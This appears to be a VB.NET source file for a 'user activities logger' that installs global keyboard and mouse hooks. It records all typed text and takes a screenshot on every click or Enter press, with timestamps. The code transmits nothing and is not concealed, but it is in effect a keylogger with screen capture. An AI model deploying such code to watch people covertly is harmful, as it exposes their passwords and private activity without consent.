Imports System.Windows.Forms
Imports Gma.System.MouseKeyHook

''' <summary>
''' Represents User Activities Logger Engine
''' </summary>
Public Class ActivityLogger
	Implements IDisposable

	Private activities As New LinkedList(Of UserActivity)
	Private actionHook As IKeyboardMouseEvents = Hook.GlobalEvents()
	Private capturer As Capture
	Private tempText As String = ""

	''' <summary>
	''' Counts number of activities performed by user
	''' </summary>
	''' <returns></returns>
	Public ReadOnly Property Count As Integer
		Get
			Return activities.Count
		End Get
	End Property

	Public Sub New(capture As Capture)
		'capturer <> Null
		Me.capturer = capture
		AddHandler actionHook.KeyPress, AddressOf KeyPressed
		AddHandler actionHook.MouseClick, AddressOf MouseClick
	End Sub

	Private Sub MouseClick(sender As Object, e As MouseEventArgs)
		Utils.Async(Sub() Trigger(e.Button.ToString() + " Click"))
	End Sub

	Private Sub KeyPressed(sender As Object, e As KeyPressEventArgs)
		If e.KeyChar = ChrW(Keys.Enter) Then
			Utils.Async(Sub() Trigger("Enter Pressed"))
		Else
			tempText += e.KeyChar
		End If
	End Sub

	''' <summary>
	''' Packs user activities and clears buffer
	''' </summary>
	''' <returns></returns>
	Public Function Pack() As UserActivity()
		SyncLock activities
			Pack = activities.ToArray()
			activities.Clear()
		End SyncLock
	End Function

	''' <summary>
	''' Forcefully trigger user activity
	''' </summary>
	''' <param name="info">Action description</param>
	Public Sub Trigger(info As String)
		SyncLock activities
			activities.AddLast(New UserActivity(info) With {.Shot = capturer.TakeShot(), .Text = tempText})
			tempText = ""
		End SyncLock
	End Sub

	''' <summary>
	''' Destroyes instance
	''' </summary>
	Public Sub Dispose() Implements IDisposable.Dispose
		SyncLock activities
			activities.Clear()
		End SyncLock
		actionHook.Dispose()
	End Sub

End Class

''' <summary>
''' Represents User Action during specific time
''' </summary>
Public Class UserActivity

	''' <summary>
	''' Gets/Sets the type of Action
	''' </summary>
	''' <returns></returns>
	Public Property Info As String

	''' <summary>
	''' Gets/Sets the Text Since previous action
	''' </summary>
	''' <returns></returns>
	Public Property Text As String

	''' <summary>
	''' Gets/Sets the time of action
	''' </summary>
	''' <returns></returns>
	Public Property Time As Date

	''' <summary>
	''' Gets/Sets image bytes
	''' </summary>
	''' <returns></returns>
	Public Property Shot As Byte()

	Public Sub New(info As String)
		Time = Now
		Me.Info = info
	End Sub

End Class